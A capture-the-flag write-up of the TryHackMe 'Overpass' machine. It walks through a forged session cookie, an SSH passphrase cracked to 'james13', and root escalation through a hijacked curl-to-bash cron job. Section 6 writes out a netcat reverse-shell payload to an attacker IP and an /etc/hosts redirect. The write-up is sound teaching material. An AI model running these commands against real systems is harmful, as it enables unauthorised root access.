# TryHackMe: Overpass Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-Penetration%20Testing-green)

A complete walkthrough of the **Overpass** machine on TryHackMe. This writeup documents the reconnaissance, web enumeration, client-side authentication bypass, SSH key cracking, and privilege escalation through a root cron job that executes a remotely downloaded script.

---

## Table of Contents

- [Overview](#overview)
- [Environment](#environment)
- [Attack Summary](#attack-summary)
- [1. Reconnaissance](#1-reconnaissance)
- [2. Web Enumeration](#2-web-enumeration)
- [3. Authentication Bypass](#3-authentication-bypass)
- [4. SSH Key Recovery](#4-ssh-key-recovery)
- [5. Initial Access](#5-initial-access)
- [6. Privilege Escalation](#6-privilege-escalation)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

| Field        | Value                             |
|--------------|-----------------------------------|
| Machine      | Overpass                          |
| Platform     | TryHackMe                         |
| Difficulty   | Easy                              |
| Target IP    | `10.49.191.215`                   |
| OS           | Ubuntu Linux                      |
| Scenario     | A password manager web application |
| Objective    | Obtain `user.txt` and `root.txt`  |

---

## Environment

| Component         | Details                       |
|-------------------|-------------------------------|
| Attacker Machine  | Kali Linux                    |
| Attacker IP       | `192.168.136.156`             |
| Target            | `10.49.191.215`              |
| Virtual Host      | `overpass.thm`                |

---

## Attack Summary

The attack chain progresses through the following stages:

1. **Port scanning** revealed SSH (22) and HTTP (80) only.
2. **Directory enumeration** exposed an admin area under `/admin`.
3. **Client-side JavaScript review** of `login.js` revealed how the login process sets the session cookie.
4. **Authentication bypass** was achieved by setting a `SessionToken` cookie manually, which granted access to a protected SSH private key.
5. **SSH key cracking** with John the Ripper recovered the passphrase for the key.
6. **Initial access** was obtained over SSH as the user `james`.
7. **Privilege escalation** exploited a root cron job that repeatedly downloads and executes a shell script from `overpass.thm`, which was redirected to the attacker's server.
8. **Root access** was obtained through a reverse shell delivered by the cron job.

---

## 1. Reconnaissance

### 1.1 Full TCP Port Scan

```bash
nmap -p- -v 10.49.191.215
```

**Results:**

| Port | State | Service | Notes |
|------|-------|---------|-------|
| 22   | open  | ssh     | OpenSSH 8.2p1 (Ubuntu)     |
| 80   | open  | http    | Golang net/http server     |

All other 65,533 ports were closed.

### 1.2 Service and Version Detection

```bash
nmap -sC -sV -p 22,80 10.49.191.215
```

Key findings:

- **SSH (22):** OpenSSH 8.2p1 on Ubuntu, with RSA, ECDSA, and ED25519 host keys.
- **HTTP (80):** A Go-based web server with the title **Overpass**, supporting `GET`, `HEAD`, `POST`, and `OPTIONS` methods.

---

## 2. Web Enumeration

### 2.1 Directory and File Enumeration

```bash
gobuster dir -u http://10.49.191.215/ -w /usr/share/wordlists/dirb/common.txt
```

```
/aboutus              (Status: 301) --> aboutus/
/admin                (Status: 301) --> /admin/
/css                  (Status: 301) --> css/
/downloads            (Status: 301) --> downloads/
/img                  (Status: 301) --> img/
```

The `/admin` path was identified as the most interesting target, since it suggested a protected login area.

### 2.2 Client-Side Script Review

The `login.js` file, loaded by the admin page, was retrieved and reviewed. The relevant logic is shown below:

```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken", statusOrCookie)
        window.location = "/admin"
    }
}
```

The script shows that the server returns the session token as plain text, and the client stores it in a cookie. The page only checks whether the response equals the string `Incorrect credentials`, which means the admin page's access control depends on the value of the `SessionToken` cookie alone.

---

## 3. Authentication Bypass

### 3.1 Forging the Session Cookie

The `SessionToken` cookie was set manually through the browser's developer tools (Storage or Application tab). Any value was accepted, which allowed access to the `/admin` page without valid credentials.

```
Cookie name:  SessionToken
Cookie value: <any non-empty value>
```

After refreshing the admin page, the protected content was displayed, including a private SSH key for the user `james`.

---

## 4. SSH Key Recovery

### 4.1 Saving the Private Key

The retrieved key was saved locally as `id_rsa` and restricted to the correct permissions:

```bash
nano id_rsa
chmod 600 id_rsa
```

### 4.2 Converting the Key to a Crackable Hash

The `ssh2john` utility from John the Ripper was used to extract a hash from the encrypted key:

```bash
ssh2john id_rsa > hash
```

### 4.3 Cracking the Passphrase

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
james13          (id_rsa)
```

The passphrase for the key was recovered as **`james13`**.

---

## 5. Initial Access

### 5.1 SSH Login as james

```bash
ssh -i id_rsa james@10.49.191.215
```

The passphrase `james13` was entered when prompted, and the session opened as `james`.

```bash
james@ip-10-49-191-215:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)
james@ip-10-49-191-215:~$ ls
todo.txt  user.txt
```

### 5.2 Reviewing the Home Directory

The file `todo.txt` contained developer notes about the password manager project, including a reminder about the team's build process:

```
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

### 5.3 User Flag

```bash
cat ~/user.txt
```

---

## 6. Privilege Escalation

### 6.1 Enumeration with LinPEAS

The LinPEAS enumeration script was transferred from the attacker machine and executed on the target to identify privilege escalation vectors.

```bash
# On the attacker machine
python3 -m http.server 8000

# On the target
wget http://192.168.136.156:8000/linpeas.sh
```

### 6.2 Analysing the System Crontab

Reviewing `/etc/crontab` revealed a root-owned job that runs every minute:

```bash
cat /etc/crontab
```

```
# m h dom mon dow user  command
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

This job downloads a script from `overpass.thm` and pipes it directly into `bash` as root. Any content served at that location is executed with root privileges on every run.

### 6.3 Hijacking the Build Script

Two conditions needed to be satisfied for the attack to work: the script had to exist at the expected path on a server controlled by the attacker, and the hostname `overpass.thm` had to resolve to that server.

A malicious `buildscript.sh` was created on the attacker machine, in a directory structure matching the path requested by the cron job:

```bash
mkdir -p downloads/src
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.136.156 1234 > /tmp/f" > downloads/src/buildscript.sh
```

A web server was started from the directory containing `downloads`:

```bash
python3 -m http.server 80
```

The target's hosts file was updated so that `overpass.thm` resolved to the attacker's IP:

```bash
cat /etc/hosts | head -n 3
```

```
127.0.0.1 localhost
127.0.1.1 overpass-prod
192.168.136.156 overpass.thm
```

### 6.4 Root Shell

A listener was started on the attacker machine to catch the reverse shell:

```bash
nc -lvnp 1234
```

On the next minute boundary, the cron job fetched the malicious script, executed it as root, and returned a shell:

```
connect to [192.168.136.156] from (UNKNOWN) [10.49.191.215] 42870
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

### 6.5 Root Flag

```bash
cat /root/root.txt
```

---

## Flags

| Flag        | Location              | Value         |
|-------------|-----------------------|---------------|
| `user.txt`  | `/home/james/user.txt` | `<user-flag>` |
| `root.txt`  | `/root/root.txt`      | `<root-flag>` |

> Flag values are intentionally omitted from this public writeup in accordance with TryHackMe guidelines.

---

## Lessons Learned

- **Never rely on client-side logic for access control.** The admin page trusted a cookie that the client could set to any value.
- **Do not expose private keys through web applications.** Storing an SSH key behind a weak check made it accessible to anyone who could reach the page.
- **Use strong passphrases on private keys.** A common word such as `james13` was recovered in seconds from a standard wordlist.
- **Never execute remotely downloaded scripts as root.** Piping `curl` output into `bash` inside a privileged cron job lets anyone who controls the download source run commands as root.
- **Protect name resolution and file write access.** Editing `/etc/hosts` to redirect a trusted hostname is a powerful attack primitive and should be restricted.
- **Review scheduled tasks as part of every privilege escalation assessment.** The root cron job was the single most valuable finding on this machine.

---

## Tools Used

| Tool        | Purpose                                         |
|-------------|-------------------------------------------------|
| Nmap        | Port scanning and service fingerprinting        |
| Gobuster    | Web directory enumeration                       |
| Browser DevTools | Inspecting and modifying the session cookie |
| ssh2john    | Converting the SSH key into a crackable hash    |
| John the Ripper | Cracking the SSH key passphrase            |
| LinPEAS     | Local privilege escalation enumeration          |
| Netcat      | Reverse shell listener                          |
| Python HTTP Server | Serving files to the target             |

---

## References

- [TryHackMe: Overpass](https://tryhackme.com/)
- [John the Ripper](https://www.openwall.com/john/)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng)
- [Nmap Documentation](https://nmap.org/book/man.html)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## Disclaimer

This writeup is intended solely for educational purposes and was performed in a legal, authorized lab environment provided by TryHackMe. The techniques described should only be used against systems where you have explicit written permission to test.

# Jai Shri Ram
